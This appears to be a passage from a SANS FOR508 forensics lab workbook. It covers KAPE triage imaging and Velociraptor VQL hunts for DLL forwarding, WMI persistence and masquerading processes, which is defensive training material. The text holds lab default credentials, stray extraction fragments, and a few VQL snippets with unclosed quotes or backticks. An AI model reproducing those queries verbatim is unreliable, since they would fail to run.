Lab 1.3: Creating Triage Images with KAPE
Objectives
1. Gain practice with KAPE and acquire a triage image from the local 508 Windows VM.
2. Demonstrate creating a smaller triage image from a full disk image
3. Create or update a USB drive with KAPE for triage collections and analysis.

Lab Preparation
This lab is completed in your 508 Windows VM
1. Launch the 508 Windows VM and log in.
• LOGIN = SANSDFIR
• PASSWORD = forensics

Background
KAPE provides the ability to forensically extract ﬁles from a mounted drive, including locked and hidden system ﬁles. The
mounted drive could be the current live ﬁle system, such as the C: drive. Alternatively, it could be a drive letter from a mounted
disk image, or even a device mounted across the network with a commercial tool such as F-Response.
For this lab, we emulate a ﬁeld acquisition by imaging the C: drive of our 508 Windows VM. We will then brieﬂy show how a
KAPE acquisition could be created from a full disk image. Finally, we provide a description for how to create a USB drive suitable

.

for acquiring a triage image from a compromised host.

Acquire Triage Image of the 508 Windows VM
This section demonstrates how a triage image can be acquired from a running system using KAPE. We will use the Windows VM
as the subject system. In a real scenario, this could be done while logged into the console, or remotely by copying KAPE to the
endpoint and launching it via remote management capabilities.
1. Browse to C:\Forensic_Program_Files\kape\Targets . Review the target conﬁguration ﬁles (.tkape ﬁles) used to deﬁne which
ﬁles and folders will be acquired by KAPE. Your view should be similar to the following:

26

© 2023 SANS Institute

.

The target ﬁles (located in subfolders) are highly customizable and can be edited easily in any text editor. In this lab, you will
use the conﬁguration as-is, which is designed to extract many useful Windows artifacts into a triage image. After trying this
lab, you should experiment by creating new target ﬁles, editing the existing ﬁles to include additional data to capture, or
commenting out existing deﬁnitions (you can comment out a target block in a conﬁguration ﬁle by preﬁxing each line in the
block with a # symbol).
2. Launch an Admin Command Prompt and change directories to C:\Forensic_Program_Files\kape\ . Then run kape.exe with
the --tlist and --tdetail options to have KAPE validate the conﬁguration ﬁles. The commands are given here:

.

cd /d "C:\Forensic_Program_Files\kape\"

kape.exe --tlist . --tdetail

Here's how this should look (note that this takes a couple minutes to run, as there are a lot of targets!):

© 2023 SANS Institute

.

27

With our provided conﬁguration, you should not have any errors resulting from this command.

.

For reference, here's an example of an error due to tab characters being used in the target conﬁguration ﬁle Zoom.tkape :

28

© 2023 SANS Institute

.

.
This is a common error when editing the conﬁguration ﬁles---spaces must be used for whitespace, not tabs. In this case, the
conﬁguration ﬁle can easily be corrected by removing the tabs and using spaces instead.

© 2023 SANS Institute

.

29

One more point about editing the conﬁguration ﬁles is that it's important that each ﬁle have a unique ID. In the screenshot
above, line 4 shows Id: 420ce1b0-bfc0-40de-a0fe-f154bbc5eec8 for this particular ﬁle. There is no signiﬁcance to this
number, other than it's unique among all the conﬁguration ﬁles in this KAPE installation. When creating new custom
conﬁguration ﬁles, be sure to use a unique ID for each new ﬁle. KAPE includes a handy feature to generate a set of random
GUIDs. Just run kape.exe --guids to create a set of 10 unique IDs.
Be sure to read the KAPE User Guide for more details about this issue and other important features of KAPE.
3. Now we are ready to create a target triage image of the 508 Windows VM by running the following commands to generate a
VHDX image in a new directory G:\Labs\kape . We will be using the !SANS_Triage target, which is a robust collection of
targets we put together as a good starting point for triage acquisitions.

.

mkdir G:\Labs\kape

kape.exe --tsource C: --tdest G:\Labs\kape --target !SANS_Triage --vhdx %COMPUTERNAME%-triage

Note
In an actual ﬁeld acquisition, a best practice would be to write the triage image directly to removable media or a network
share to avoid overwriting unallocated space on the subject machine. However, for simplicity we are writing the image to
the local G:
drive.

KAPE should start by reporting the command-line parameters it will use. Notice that we provided the environment variable
%COMPUTERNAME% as part of the ﬁlename that will be used when creating the VHDX. When KAPE executes the command, it will

expand the environment variable, therefore using the name

SANS-SIFT-triage to preﬁx ﬁlenames.

KAPE also reports the number of target ﬁles speciﬁed. When it reads !SANS_Triage.tkape compound target ﬁle, it locates 18
targets (in the current version of the ﬁle). This is a compound target ﬁle which primarily references other compound target
ﬁles to group together artifacts of a particular type. It's worth taking a look at the conﬁguration of this ﬁle, as well as the
compound targets it references. The SANS Triage target ﬁle can be opened from C:
\Forensic_Program_Files\kape\Targets\Compound\!SANS_Triage.tkape . Once opened, you should see something like the

following:

30

© 2023 SANS Institute

.

.
Once KAPE begins the acquisition, you will see a lot of output to the console. Much of it looks like error messages, but it's
generally reporting normal status messages, such as ﬁles that it will defer collecting because the are locked by the operating
system. Most likely, KAPE will ﬁnish without any signiﬁcant error.

© 2023 SANS Institute

.

31

The full process will likely take 5-20 minutes, depending on the speed of your system. In the end, you should have a zipped
VHDX ﬁle located in G:\Labs\kape .

Note that KAPE produces a console log ﬁle with the triage package. This is all the detailed information that is reported by

.

KAPE when it executes. In addition, inside the collection are copy log ﬁles and possibly a skip log ﬁle as well. The copy log
provides a list of all ﬁles copied into the triage image. The skip ﬁle provides a list of any ﬁles that were not copied because
their hash matched the hash of a ﬁle already copied. This is the deduplication feature that is enabled by default when running
KAPE. It's a very handy feature, but it's important to know about it, because it's quite possible that you will look for a ﬁle that
appears to be missing, when in reality the ﬁle was copied from a different location but not copied again due to deduplication.
Be sure to review the skip log if you encounter any missing ﬁles.
Here's a look at the mounted VHDX created for this lab demonstration:

32

© 2023 SANS Institute

.

Acquire Triage Image from a Full Disk Image
In some situations, it can be useful to create a triage image from an acquired disk image. One scenario is where you have a large
disk image and you would like to share the critical artifacts with colleagues to divide and conquer the analysis. Transferring a
couple of gigabytes of the most useful artifacts via a triage image is far more eﬃcient than, for example, transferring a 500
gigabyte full disk image!
Another scenario is where you are working a compromise in a cloud environment and were able to get a snapshot of the
compromised host in the cloud. It may be useful to create a triage image to bring back to your on-prem environment for analysis
rather than transferring the entire snapshot image back.
Whatever the scenario, once you have a disk image that you'd like to create a more targeted triage image from, you will need to
mount that disk image in Windows so that it appears as a drive letter. Probably the best free tool for doing so is Arsenal Image
Mounter (AIM). AIM has a number of useful licensed features, but the core features are available for free without purchasing a
license.
For this part of the lab, we'd like to create a triage image from a disk image of RD01. The RD01 disk image is available on the
FOR508 ISO "B". You will need to mount ISO "B" to your Windows VM as a DVD drive. To do so, you will need to follow the ﬁrst part
of the guide titled "VM File Transfer Options" in the Resources section of the electronic workbook. Here is the direct link to that
section: Connect ISO image ﬁle to VM as a DVD drive.
Once you have the ISO mounted as a DVD, browse into the DVD drive letter and locate the E01 disk image for RD01. It should be in

.

the path <Drive Letter>\SRL-Data\Disk-Images\rd01-c-drive.E01 .

If you see rd01-c-drive.E01 disk image ﬁle in the VM, you are ready to proceed!
1. Start Arsenal Image Mounter (AIM) by double-clicking the link on the desktop.

© 2023 SANS Institute

.

33

A splash screen will appear indicating it is "Loading". After 30 seconds or so, you should see a window indicating "No License

hi

de

01

.ir

Detected - Free Mode Enabled". That will work ﬁne for our purposes. Click OK.

2. You should now see the window for AIM with the option to "Mount disk image". Click that option and then browse to the
\SRL-Data\Disk-Images directory on the DVD. Select rd01-c-drive.E01 and click Open.

34

© 2023 SANS Institute

.

3. A new window appears with a variety of options for how to mount the disk image. In this case, we want to choose the default,
which is "Disk device, read only". In some cases, it is useful to mount a disk image in a simulated write mode. When doing so,
the writes are stored in a temporary ﬁle, so nothing is actually changed on the disk image. In this case, however, we want to
use read-only to avoid making any changes to the disk (even if they are simulated changes) as we acquire ﬁles for the

.

targeted triage image. Click OK.

© 2023 SANS Institute

.

35

.
4. After a moment or two, you may see a notiﬁcation from Windows that a new drive letter is available. In the case of our
demonstration, the drive letter appeared as F: . The drive letter on your system may be different. Browse to the new drive letter
(likely labeled Windows 11 ) and view the ﬁles and folders. It should look similar to this:

36

© 2023 SANS Institute

.

5. Once the drive is mounted as a drive letter, the acquisition process is the same as before. The only necessary difference is that
the --tdest drive letter is no longer C: , but instead whichever drive letter was assigned when AIM mounted the image. In our

.

example, it was F: . Therefore, we could create a triage image as before in the following way:

Note

In the previous section, we used the environment variable %COMPUTERNAME% to dynamically insert the hostname into
the triage image ﬁle to be created. In this case, we know the disk image came from RD01, so we'll provide that speciﬁc
name for the output triage ﬁle. (i.e. --vhdx rd01-triage )

kape.exe --tsource F: --tdest G:\Labs\kape --target !SANS_Triage --vhdx rd01-triage

© 2023 SANS Institute

.

37

.
38

© 2023 SANS Institute

.

Using gKape
You may have noticed a shortcut to "gKape" on the desktop in the same fence as Arsenal Image Mounter. If you haven't
used gKape, it's deﬁnitely worth trying. It's pretty self-explanatory, but in a nutshell, it allows you to visually conﬁgure
KAPE and then execute it via the GUI, or copy the command-line at the bottom and use it in the ﬁeld or remotely. Just
remove the --gui parameter at the end if running it via the console.

.

Here's a GUI-based conﬁguration that matches our command-line conﬁguration:

© 2023 SANS Institute

.

39

6. As in the prior section, once KAPE starts in the console, you will see messages about the targets it is going to collect and ﬁles
deferred because they are locked by the operating system. There should be quite a bit fewer locked (deferred) ﬁles this time
since the mounted image is not the active system partition like the C drive we collected earlier. However, there are still a few
system ﬁles that are locked, such as the $MFT that holds all the metadata for the NTFS ﬁle system.
Once again, give it 5-20 minutes to complete. Once ﬁnished, you should see a zipped triage image in

G:\Labs\kape similar to

the following:

You now have a much smaller image to share amongst your team with the vast majority of Windows forensic artifact ﬁles
included.

Note
The creation of this triage image is only for practice purposes and once you are ﬁnished reviewing you should delete it to
save disk space. You do not need and should not use this image to complete future exercises. We will provide you with a
vetted triage image when needed later in the course.

Bonus: Create a KAPE Triage USB
The process to create and use KAPE from a USB drive is very simple. The purpose of this short walkthrough is to provide a
reminder for this method running KAPE to collect a triage image as it is anything else. Note that this is not a guide to create a

.

bootable USB. We are describing how to copy KAPE to a USB drive so that KAPE can be run from that drive on a live system.
Putting KAPE on a bootable Windows USB is not diﬃcult, but it's beyond the scope of this lab.
• If this is for an active case, use the largest USB thumb drive you can. This method also works with the larger external USB
drives. Plan to collect your target data to the same USB that KAPE is installed on. It is strongly suggested to format the USB
with the exFAT ﬁle system for large ﬁle support.
For a fresh USB that does not have KAPE installed:
1. We recommend you update the Zimmerman Tools and KAPE on the computer that you will be using to make the USB. We
describe this process in the Resources section, in the document titled "How to Update Zimmerman Tools & KAPE".
2. Drag and drop the KAPE folder from your computer to the USB drive. It's important that you get the
also the subdirectories with the target ﬁles (and modules, if used for post-processing).
3. That's it. Since KAPE is self-contained, it's that simple.

40

© 2023 SANS Institute

.

kape.exe executable, but

Lab 1.4: Scaling Incident Response and Threat Hunting
Objectives
• Learn how to use Velociraptor for incident response and threat hunting engagements
• Search useful analysis artifacts and review their conﬁguration
• Review the results of Velociraptor hunts to locate suspicious activity at scale
• Use the Velociraptor Query Language (VQL) within notebooks for data reduction and outlier analysis
• Optional: Utilize the Kansa PowerShell IR Framework for threat hunting

Lab Preparation
This lab is completed in your 508 Windows VM
1. Launch the 508 Windows VM and log in.
• LOGIN = SANSDFIR
• PASSWORD = forensics
2. Open an Administrator Command Prompt window and change directories to G:\SRL_Evidence\velociraptor :

.

cd /d G:\SRL_Evidence\velociraptor

3. One of the many impressive features of Velociraptor is its portability. The entire server installation can easily be moved simply
by copying ﬁles from one system to another. Consequently, we've been able to easily acquire a copy of Stark Research Lab's
Velociraptor server and use it for analysis purposes in this lab.
One thing to take into account when attempting to run an older Velociraptor installation is that the server certiﬁcate expires
after 1 year. Fortunately, a new certiﬁcate can be generated easily. Let's run the command to update the server conﬁg with a
new key. We'll then start the frontend server in verbose mode with the new conﬁg ﬁle.

© 2023 SANS Institute

.

41

velociraptor.exe --config server.config.yaml config rotate_key > newkey_server.config.yaml

Now start SRL's Velociraptor frontend server in verbose mode using the new server conﬁg ﬁle:
velociraptor.exe --config newkey_server.config.yaml frontend -v

4. With the server running in the background, start up a browser in the Windows VM and go to https://localhost:8889 to connect

.

to the Velociraptor web-based user interface (WebUI). Because this is a self-signed deployment type, you will need to choose
"Advanced" and then "Continue to localhost (unsafe)" when warned about the connection.

42

© 2023 SANS Institute

.

.

5. Provide the username sansdfir and password forensics when prompted. You should now be logged into the home page:

6. Velociraptor provides different UI themes, including dark modes, which may improve the user experience. We've chosen
"Velociraptor Classic (light)" for these screenshots. Feel free to adjust the theme by clicking sansdfir at the top-right and
then use the Theme drop-down, as shown below. (Note that the timezone should remain UTC.)

© 2023 SANS Institute

.

43

7. In this lab, we are going to focus on collected data via the Hunt Manager page. To navigate to this page, click the "Crosshairs"

.

button on the navigation menu. If you'd like to see the names of the pages, click the 3-bar "Hamburger" button at the top-left.

44

© 2023 SANS Institute

.

.

8. Once on the Hunt Manager screen, there are a dozen hunts available named after the artifact used to collect the hunt.

© 2023 SANS Institute

.

45

9. Before getting started with analysis, let's get familiar with the View Artifacts page. This page is helpful for reviewing the
conﬁguration of the VQL artifacts installed on the Velociraptor server. There are 348 pre-populated in the version of
Velociraptor we have in the VM. Each new version of Velociraptor tends to add more. Also, analysts can easily create their own
and share them through Velociraptor's Artifact Exchange at https://docs.velociraptor.app/exchange/.
Navigate to Artifacts page by clicking on the "Wrench" button in the menu along the left, as shown below.
Windows.Detection.ForwardedImports

The ﬁrst hunt we'll examine is the result of running the

artifact. Let's analyze the

conﬁguration of this artifact.
In the top-right search ﬁeld, type in "dll forwarding". That will narrow down the artifacts to just one. Choose

.

Windows.Detection.ForwardedImports and read through the description.

To summarize the technique, we are looking for DLLs forwarding function calls to other DLLs by the same name. Forwarded
functions are normal, but it is much more rare to see a DLL forwarding imports to a DLL sharing the same name elsewhere in
the ﬁle system. While this occasionally happens legitimately, it is also one of the easiest ways for attackers to put their
malicious DLL code between a legitimate executable and the functions it requires from a legitimate DLL.

46

© 2023 SANS Institute

.

10. Now scroll further down the page to review the "Parameters" and VQL "Source" sections as well. Although it's not obvious
here, the Parameters section lists text ﬁelds or checkbox ﬁelds available to the analyst when running the query. These allow

.

for customizing the query beyond the default conﬁguration.

Notice the ﬁrst parameter above provides a default "DLLGlob" of C:\windows***.dll . This means that by default, it will
search DLL ﬁles recursively starting from C:\Windows .
The "ExcludeRegex" is used to skip ﬁles and folders matching the regular expression as a means to limit false positives. In
this case, notice folders matching WinSXS or Servicing will not be scanned.
Understanding the default scope of this artifact is important context for the ﬁrst hunt that we will analyze. So with that, let's
move on to the analysis!

© 2023 SANS Institute

.

47

Velociraptor Lab Questions
DLL Hijacking Analysis
As discussed in class, there are a number of ways attackers can trick the operating system into loading malicious DLLs. We will
use Velociraptor's Windows.Detection.ForwardedImports to hunt for a common DLL hijacking technique.
Hunting Forwarded Imports from C:\Windows

1. Navigate back to the Hunt Manager page by clicking on the "Crosshairs" button near the top of the navigation menu. Then

.

choose the second of the two Windows.Detection.ForwardedImports hunts. It's the one with Hunt ID H.CFBIVD4NKL906 .

You should see the Overview tab in the bottom pane of the screen. Look toward the bottom left and notice that under
"Parameters" it only lists the name of the artifact ( Windows.Detection.ForwardedImports ). If customizations had been made
to the parameters, such as a different DLLGlob value, it would have been displayed here. We'll see soon that the other hunt for
Windows.Detection.ForwardedImports does have a custom parameter listed here. Also, notice that this hunt was scheduled

to run on 30 clients and it completed on all 30.

48

© 2023 SANS Institute

.

2. Now click on the Notebook tab in the bottom pane. By default, it will list up to 50 rows from the query. In the example
screenshot below, we see a number of hits from the Windows.detection.ForwardedImports artifact for host
rd09.shieldbase.com . If you scroll further down, you'll see more hits. In fact, there are 180 in total, which we'll be able to see

soon after removing the default viewing limit of 50.

Tip
At the bottom of the results page you will often see a red line with Query Stats. This is simply providing some query

.

processing information and is n ot an error message.

3. Quickly scroll through the list of results on this page. When you get to the bottom of the page, you can click the buttons to
show more results per page and to see additional pages.

© 2023 SANS Institute

.

49

Scrolling through the list in this way is one option for review. Since the total number in this case is 180 (we only see 50 right
now), it's not out of the question to review all the results. However, let's perform some data transformations to make it a little
easier to review.
4. Start by clicking the title of the notebook cell ( Windows.Detection.ForwardedImports in this case) to see the cell toolbar. Then

.

click the "Pencil" button to expose the VQL editor window.

50

© 2023 SANS Institute

.

5. We're going to create a couple of different groupings to analyze the data in different ways:

.ir

• One grouping to ﬁnd the individual hosts that had imports forwarded from and to a DLL with the same name

01

• Another grouping to verify which imports are forwarded on the hosts

To accomplish grouping by hosts, we can simply add GROUP BY Fqdn in place of the LIMIT 50 . (The LIMIT 50 is the default

hi

shown here (note that Fqdn is case-sensitive):

de

to provide quick results even if there are thousands of results available.). Try that ﬁrst and then click the "Save" button, as

6. For this part of the analysis, we only care about identifying the individual hostnames, so let's do a little more transforming to
make it easier to review the hostnames. Update the entire VQL cell to the following. You can copy and paste the following
codeblock and overwrite the existing VQL, or manually type the changes (changed lines are highlighted yellow for easier
reference). Click the "Pencil" button to edit the ﬁeld and then the "Save" button:

© 2023 SANS Institute

.

51

/*
# Windows.Detection.ForwardedImports
*/

SELECT Fqdn FROM source(artifact="Windows.Detection.ForwardedImports")
GROUP BY Fqdn

ORDER BY Fqdn

The changes here involve updating the SELECT statement to show only the Fqdn ﬁeld instead of all ﬁelds (we removed the *
asterisk). We also added an ORDER BY Fqdn to sort the results alphanumerically, making it a little easier to review. The results

.

should look like the following (click 30 or 50 at the bottom left to see all results on one page):

52

© 2023 SANS Institute

.

.
7. Next, we'd like to see if it's the same functions from the same DLL. As a ﬁrst look, let's try to count the number of forwarded
functions discovered for each host. We can do that by adding a new ﬁeld to the SELECT line. We'll add count() AS Count .
Since we're grouping by Fqdn , this will count the number of times each

Fqdn showed up in the results. Click the "Pencil"

button to edit the VQL and then the "Save" button:
/*
# Windows.Detection.ForwardedImports
*/

SELECT Fqdn,count() AS Count FROM source(artifact="Windows.Detection.ForwardedImports")
GROUP BY Fqdn
ORDER BY Fqdn

© 2023 SANS Institute

.

53

If each host forwards the same functions, each host should show up the same number of times in the results. From the new
table, we can see that each host showed up in the results 6 times (click 30 or 50 at the bottom left to see all results on one

.

page).

8. Now that we've conﬁrmed all 30 hosts are in the results, let's count the number of times each function shows up. The ﬁeld to
count in this case is ForwardedImport .

Note
You might want to review all the available ﬁelds again. To do so, change Fqdn on the SELECT line back to the * asterisk
and then click the Save button to see all the ﬁelds.

Here's the VQL we can use to display and count the ForwardedImport ﬁeld:
/*
# Windows.Detection.ForwardedImports
*/

SELECT ForwardedImport,count() AS Count FROM
source(artifact="Windows.Detection.ForwardedImports")
GROUP BY ForwardedImport
ORDER BY ForwardedImport

54

© 2023 SANS Institute

.

The results may be a little surprising. We see that there are 3 imports forwarded, each one 60 times:

Since there are 3 imports showing up 60 times, but only 30 hosts, then there must be 2 different DLLs forwarding the same
functions. Let's update the VQL to count DLLs loaded based on the DLL path. Replace each instance of ForwardedImport with
DllPath , as shown below. (Note that ﬁelds are case-sensitive, so

DLLPath is not the same as DllPath .)

/*
# Windows.Detection.ForwardedImports
*/

.

SELECT DllPath,count() AS Count FROM source(artifact="Windows.Detection.ForwardedImports")
GROUP BY DllPath
ORDER BY DllPath
We now see that there are 2 different DLLs forwarding the 3 imports. One is the 64-bit version of rpcrt4.dll in C:
\Windows\System32 and the other is the 32-bit version of the same DLL in C:\Windows\SysWOW64 .

© 2023 SANS Institute

.

55

Threat Hunt Results
• Execution: Successful
• Conclusion: Likely false positive activity detected
• Comments: We veriﬁed that all 30 hosts are forwarding the same functions from the same DLLs. It would be highly
unlikely for an attacker to compromise every host in the environment in the exact same way. That alone is a good
indicator that this is a false positive. In researching the reason for rpcrt4.dll to forward imports, it isn't clear what the
exact purpose is. However, Matt Green also noted this as a false positive in a similar analysis he wrote about in a
Velociraptor blog article titled "Detecting DLL Hijacking With VQL". In this case, it seems reasonable to assume that this is
also a false positive in the Stark Research Labs network.

Hunting Forwarded Imports from C:\Users

1. Let's look at the other Windows.Detection.ForwardedImports hunt. Click on the hunt at the top of the list. The one with Hunt
ID H.CFBJBAGLRDTKS . Notice at the bottom of the Overview tab that this one has a custom parameter listed. It searches for

.

DLLs recursively starting from the C:\Users folder. The speciﬁc syntax is C:\Users\**\*.dll .

2. Now click the Notebook tab to view the results. If you scroll to the bottom, you'll see that there are 28 functions being
forwarded. The hostname of the initial set visible is from rd08.shieldbase.com .

56

© 2023 SANS Institute

.

.
3. 28 rows are not too many to simply browse through to review. However, in order to make it a little easier to see which hosts
had DLLs in the C:\Users folder that forwarded imports to DLLs by the same name, how would you change the VQL to group
by the hostname ﬁeld?
Reminder: click on the notebook cell title to expose the VQL editor.
________________________________________________________________
________________________________________________________________
Tip
Use the GROUP BY function.
In this artifact, the hostname is found in the Fqdn ﬁeld. Remember, ﬁeld names are case-sensitive.

© 2023 SANS Institute

.

57

Solution
Try the following VQL:
/*
# Windows.Detection.ForwardedImports
*/
SELECT Fqdn FROM source(artifact="Windows.Detection.ForwardedImports")
GROUP BY Fqdn

• Alternatively, you could have left the SELECT statement with an * asterisk, but switching to just Fqdn cleans up the
results a little more.
Which hosts are identiﬁed by the hunt?
________________________________________________________________
________________________________________________________________
Solution
• rd04

.

• rd08

4. Can you craft VQL in the notebook to make it easy to identify the DLLs? Can you do it in such a way that it shows the
hostnames along with the DLLs?
________________________________________________________________
________________________________________________________________

58

© 2023 SANS Institute

.

Hint #1 - Identify the DLLs that are forwarding imports
DllPath is the ﬁeld you likely want to GROUP BY .

Hint #2 - Identify which hosts load which DLLs
To see the host, you either want to SELECT Fqdn , or simply all ﬁelds * .
Solution
Try the following VQL:

hi

de

01

.ir

/*
# Windows.Detection.ForwardedImports
*/
SELECT DllPath,Fqdn FROM source(artifact="Windows.Detection.ForwardedImports")
GROUP BY DllPath

5. What processes are these DLLs likely targeting?
________________________________________________________________
________________________________________________________________
Solution
• OneDrive on RD08
• Slack on RD04

© 2023 SANS Institute

.

59

Threat Hunt Results
• Execution: Successful
• Conclusion: Suspicious activity detected - requires follow-up on RD04 and RD08
• Comments: Although it doesn't guarantee a compromise, it's quite suspicious that just 2 hosts in the network have DLLs
forwarding imports to DLLs by the same name (from within the C:\Users directory). Furthermore, the fact that the DLLs
are in the same folder as processes that are likely conﬁgured to start automatically when the user logs in is another
indicator that these would be good opportunities for an attacker to establish persistence. And unlike searching for
forwarded imports in C:\Windows , these locations do not require the attacker to have Administrator rights. Regular user
rights would work for placing DLLs in these locations. This is perfect for an attacker that has compromised a standard
user account without admin rights.

WMI Event Consumer Analysis
1. Let's investigate another persistence method. Velociraptor has the ability to query the WMI database for Event Consumer
information. This is a nice threat hunt because in most environments, there will be just a few legitimate event consumers.
Therefore, it's easy to stack the results and look for the outliers. Likely there are just a few (if any) outliers to track down.
In the Hunt Manager page, choose the hunt titled Windows.Persistence.PermanentWMIEvents . It's the one with Hunt ID
H.CF9ENNSMMKBN8 . Have a look at the Overview tab and notice that it was run without any custom parameters. Also, it was

.

scheduled for 30 clients and all 30 clients ﬁnished the query.

60

© 2023 SANS Institute

.

2. Now click on the Notebook tab. The default is to show up to 50 rows. This one only has 31 rows, but the rows are pretty hard
to review because they have nested JSON with a lot of subﬁelds.

3. There are a few ways to massage the data to make it a little more user friendly to work with. Let's start by simply pulling out
the Name subﬁeld from both the event consumer and the event ﬁlter.

.

In order to display speciﬁc subﬁelds within nested JSON, VQL uses "dot" notation. For example, to pull out the

Name ﬁeld

within ConsumerDetails , the syntax would be ConsumerDetails.Name . So with that knowledge, how would you change to the
default VQL in the Windows.Persistence.PermanentWMIEvents notebook to display the Consumer Details name, the Filter
Details name, and the hostname?
Reminder: click on the notebook cell title to expose the VQL editor.
Tip
In the SELECT statement, remove the * asterisk and include the ﬁelds you want separated by commas.
Solution

/*
# Windows.Persistence.PermanentWMIEvents
*/

SELECT ConsumerDetails.Name,FilterDetails.Name,Fqdn FROM
source(artifact="Windows.Persistence.PermanentWMIEvents")
LIMIT 50

© 2023 SANS Institute

.

61

4. Based on the list of event consumers, is there one that clearly stands out? Which host was it found on?
________________________________________________________________
________________________________________________________________
Solution
"Narrator" was the standout. It is on wkstn05.shieldbase.com . You probably didn't have to look too far down the results to

.

see that one standing out.

5. Which of the two commonly abused event consumers is this? Note that you will need to bring back the full details of the
ConsumerDetails ﬁeld. You will also need to infer the type (the query results do not explicitly label it).

Sample VQL Query
Use the following VQL to review the details of that particular entry:
/*
# Windows.Persistence.PermanentWMIEvents
*/
SELECT * FROM source(artifact="Windows.Persistence.PermanentWMIEvents")
WHERE ConsumerDetails.Name =~ 'Narrator'

Review the results and identify the suspicious event consumer type:
CommandLine or ActiveScript

62

© 2023 SANS Institute

.

________________________________________________________________
Solution
The reference to an executable within the consumer makes this most likely to be a CommandLine event consumer.
What does it run, and when does it run?
Solution
It launches C:\Windows\Update\narrator.exe . It monitors the system and executes the command between 201 seconds

.

and 323 seconds of uptime. In other words, approximately 3-5 minutes after startup.

6. In a larger environment, it would be better to stack the results to ﬁnd the outliers, rather than looking at all the individual
results row-by-row. What VQL could you use to count the number of unique

ConsumerDetails and sort them by count in

ascending order (such that the outliers that occur least frequently are at the top)?

Hint #1 - Reminder of how to count
Remember the count() AS Count used with the SELECT statement will count the occurrences of the grouped ﬁeld.

© 2023 SANS Institute

.

63

Hint #2 - How to specify ascending order
This is a bit of a trick question. The default sort order is ascending. On the other hand, if you wanted to force descending
order, you would add the keyword DESC to the end of the ORDER BY function.
Solution
This VQL will work:
/*
# Windows.Persistence.PermanentWMIEvents
*/
SELECT *,count() AS Count FROM source(artifact="Windows.Persistence.PermanentWMIEvents")
GROUP BY `ConsumerDetails`
ORDER BY `Count`

Here's a little cleaner way to review it initially (and to provide a screenshot), but you would still need to go back to the
details to analyze any suspicious entries, like "Narrator":

.

/*
# Windows.Persistence.PermanentWMIEvents
*/
SELECT ConsumerDetails.Name AS ConsumerName,FilterDetails.Name AS FilterName,Fqdn AS Hostname,count() AS
Count FROM source(artifact="Windows.Persistence.PermanentWMIEvents")
GROUP BY `ConsumerName
ORDER BY `Count`

Notice that the results are in ascending order. As noted in Hint #2 above, the default is ascending. On the other hand, if
you wanted the results in descending order, add DESC to the end of the ORDER BY function (e.g. ORDER BY 'Count' DESC ).

64

© 2023 SANS Institute

.

Threat Hunt Results
• Execution: Successful
• Conclusion: Suspicious activity detected - requires follow-up on WKSTN05
• Comments: Large networks will always have some systems that deviate from the norm. That can certainly include WMI
Event Consumers. However, since this is not a typical method for auto-starting tasks, any outliers should be investigated.

Hiding in Plain Sight
Attackers are known to name their malware after legitimate processes and try to place them in common locations. Velociraptor
includes several artifacts that can be used to hunt for this type of activity. Let's review one of these hunts run in Stark Research
Labs.
1. One of the collected hunts we will review uses the artifact Windows.Attack.UnexpectedImagePath . Have a look at this artifact
in the View Artifacts page (click the "Wrench" button on the navigation bar). Then in the top-right search ﬁeld, type
"unexpected path". Select Windows.Attack.UnexpectedImagePath at the bottom of the returned results and review the
description and conﬁguration details. Notice the reference to the SANS "Hunt Evil" blue poster. This artifact conveniently
automates and scales one of the hiding techniques we discuss in Section 1 of FOR508. Excellent! Also notice that there are a

.

lot of process paths that are checked via the default parameters.

© 2023 SANS Institute

.

65

.
2. Let's go back to the Hunt Manager page and locate the hunt for this artifact titled Windows.Attack.UnexpectedImagePath . The
Hunt ID is H.CF9K2GEAIQP9E . Review the Overview tab to verify the number of hosts scheduled and completed, as well as note
any changes to the default parameters.

66

© 2023 SANS Institute

.

.
In this case, there were no changes to the default parameters and the hunt completed on all 30 hosts.
3. Now go to the Notebook tab to review the results. Does it appear that there were any hosts running processes with common
names from unusual locations?

© 2023 SANS Institute

.

67

Solution
• No. There were no returned rows from the query ("No Data Available"), thus indicating the query did not have any hits.

Note
If you wanted to conﬁrm any particular host was queried, check the Clients tab and ﬁnd the host of interest. For
example, RD01 was queried on 2023-01-27 at 03:13:10 UTC, with zero results returned from the query, according to the

.

client ﬂow logs. (A "ﬂow" is a query and any corresponding results returned.)

Threat Hunt Results
• Execution: Successful
• Conclusion: Clean
• Comments: Hunt completed successfully. Fortunately, it returned no instances of processes with common names running
from unusual locations.

68

© 2023 SANS Institute

.

Optional Homework: Additional Threat Hunting with Velociraptor
Hunting for Suspicious Processes
There are several other Velociraptor hunts available to analyze. For example, the results of

Windows.System.Pslist (Hunt ID

H.CF9DVNME65JGM ) includes at least one malicious process that we have not yet discovered. It also has a lot of data in the results,

so it provides a good opportunity to perform data reduction via ﬁlters--something we didn't need to do in the previous analyses.
Let's dig in to see how both data reduction and data stacking techniques can pay off.
1. For initial data reduction, one idea is to ﬁlter out signed binaries. Although attackers sometimes sign their code, it's still
relatively rare for Windows-based malware to be signed. So how do we ﬁlter out data such as signed code using
Velociraptor's VQL? It involves using the WHERE function to specify criteria for what to include (or NOT include).
To understand the data acquired by the Windows.System.Pslist artifact, you could review it in the View Artifacts page. But to
summarize it here, the artifact queries the host for actively running processes. Then for each process, it calculates hashes and
validates digital signatures (if available).
This artifact returns a lot of data. Usually well over 100 rows per client. If you remove the LIMIT 50 line from the default
notebook VQL, you'll see it collected data from 5,082 processes that were running on the 30 clients. That's deﬁnitely a number
too large to look through row-by-row! So, let's utilize the Authenticode ﬁeld and WHERE function to ﬁlter out signed processes.

Note
We generally don't ﬁlter out signed code from vendors we don't have the highest trust in, but for this lab, we're going to
ﬁlter out all signed code. This is a reasonable ﬁrst pass to look for suspicious processes. At the end of this analysis, we'll
also discuss an option for stacking certiﬁcate information to look for outliers among the signed code.

.

There are quite a few subﬁelds available in the Authenticode data. Notice the Trusted subﬁeld. This is a useful one to take a
rough cut at removing all signed processes. As we did with the WMI Event Consumer Analysis, we can use dot notation to
access the JSON subﬁelds.
The WHERE clause as shown here accomplishes this ﬁlter:
/*
# Windows.System.Pslist
*/
SELECT * FROM source()

WHERE Authenticode.Trusted =~ 'untrusted'
LIMIT 50

As part of data reduction, you may want to remove some unnecessary display columns, as well as noisy data within certain
columns. For example, you probably don't care to see all hash values for every binary. Let's adjust our

SELECT statement to be

a little more selective.
/*
# Windows.System.Pslist
*/

© 2023 SANS Institute

.

69

SELECT Name,Exe,CommandLine,Hash.SHA1 AS SHA1,Authenticode.Trusted,Username,Fqdn FROM
source()
WHERE Authenticode.Trusted =~ 'untrusted
LIMIT 50

2. Now let's work on data stacking the remaining items. This technique is also known as Least Frequency of Occurrence (LFO)
analysis.
